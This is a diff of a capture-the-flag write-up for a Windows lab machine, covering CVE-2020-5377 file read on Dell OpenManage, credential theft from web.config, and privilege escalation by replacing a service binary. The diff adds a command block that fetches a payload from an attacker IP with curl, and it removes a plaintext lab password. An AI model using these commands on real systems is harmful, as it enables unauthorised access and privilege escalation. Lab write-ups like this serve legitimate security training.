@@ -1,7 +1,9 @@
 # Hacksmartersecurity
 
-
+#Windows 
 ## Reconnaissance
+
+I started running nmap and I got this following result.
 
 ```
 $ nmap -p- -sV -sC 10.66.133.192
@@ -86,23 +88,84 @@ PORT     STATE SERVICE       VERSION
 SF-Port1311-TCP:V=7.98%T=SSL%I=7%D=2/24%Time=699D98C0%P=x86_64-pc-linux-gn
 ```
 
+By accessing FTP, I found a file `Credit-Cards-We-Pwned.txt` with some information, but nothing interesting.
 
+<figure><img src="hacksmartersecurity-1.png" alt=""><figcaption></figcaption></figure>
+
+To download a `.png` file, it needs to use `binary` command. But there is nothing important too.
+
+<figure><img src="hacksmartersecurity-2.png" alt=""><figcaption></figcaption></figure>
+
+By accessing port `1311` I got this page.
+
+<figure><img src="hacksmartersecurity-3.png" alt=""><figcaption></figcaption></figure>
+
+Accessing with HTTPS, we can see a login page.
+
+<figure><img src="hacksmartersecurity-4.png" alt=""><figcaption></figcaption></figure>
+
+## Enumeration
+
+I was able to find the version of `Dell OpenManage Server Administrator`. 
+
+<figure><img src="hacksmartersecurity-5.png" alt=""><figcaption></figcaption></figure>
+
+Searching for public exploits, I found a `CVE 2020-5377`. It allows us to read a file from the server. We can confirm by reading `\etc\hosts` file.
+
+<figure><img src="hacksmartersecurity-6.png" alt=""><figcaption></figcaption></figure>
+
+By reading the file `/Windows/System32/inetsrv/Config/applicationHost.config`, we can confirm the path to try to read the `web.config` file.
+
+<figure><img src="hacksmartersecurity-7.png" alt=""><figcaption></figcaption></figure>
+
+## Shell as `Tyler`
+
+By reading the `web.config` file, we got credentials for the user `tyler`.
+
+<figure><img src="hacksmartersecurity-8.png" alt=""><figcaption></figcaption></figure>
+
+I was able to login as Tyler using SSH.
+
+<figure><img src="hacksmartersecurity-9.png" alt=""><figcaption></figcaption></figure>
+
+I was able to read the `user.txt` flag. 
+
+<figure><img src="hacksmartersecurity-10.png" alt=""><figcaption></figcaption></figure>
+## Privilege Escalation
+
+By running `PrivescCheck.ps1` script, I found an installed program Spoofer. It indicates that we can take advantage of this to escalate the privilege.
+
+<figure><img src="hacksmartersecurity-11.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="hacksmartersecurity-12.png" alt=""><figcaption></figcaption></figure>
+
+We can confirm accessing `Program Files (x86)` on `C:\`.
+
+<figure><img src="hacksmartersecurity-13.png" alt=""><figcaption></figcaption></figure>
+
+We can check the service and we can see that is running as `LocalSystem`.
+
+<figure><img src="hacksmartersecurity-14.png" alt=""><figcaption></figcaption></figure>
+
+Checking the version.
+
+<figure><img src="hacksmartersecurity-15.png" alt=""><figcaption></figcaption></figure>
+
+ We have full control over the service binary, we can replace it with a malicious executable. We can't use `msfvenom` due to Windows Defender running. We can create an executable that will add the `tyler` user to Administrators local group. Let's create a simple C code and compile it into an executable for Windows. 
+
+<figure><img src="hacksmartersecurity-16.png" alt=""><figcaption></figcaption></figure>
+Now we need to stop the service, replacing the service binary with our payload and starting it again.
 
 ```
-https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py
+sc stop spoofer-scheduler
+move spoofer-scheduler.exe spoofer-scheduler.exe.bak
+curl http://192.168.130.101:4444/payload.exe -o spoofer-scheduler.exe
+sc start spoofer-scheduler
 ```
 
+Now we need to re-login. We can see that now `tyler` is a member of the Administrators group.
 
+<figure><img src="hacksmartersecurity-17.png" alt=""><figcaption></figcaption></figure>
 
-    <add key="Username" value="tyler" />
-    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
+Reading the final flag.
 
-
-
-```
-file > /Windows/System32/inetsrv/Config/applicationHost.config
-```
-
-```
-$ ssh tyler@10.66.167.68
-```
+<figure><img src="hacksmartersecurity-18.png" alt=""><figcaption></figcaption></figure>
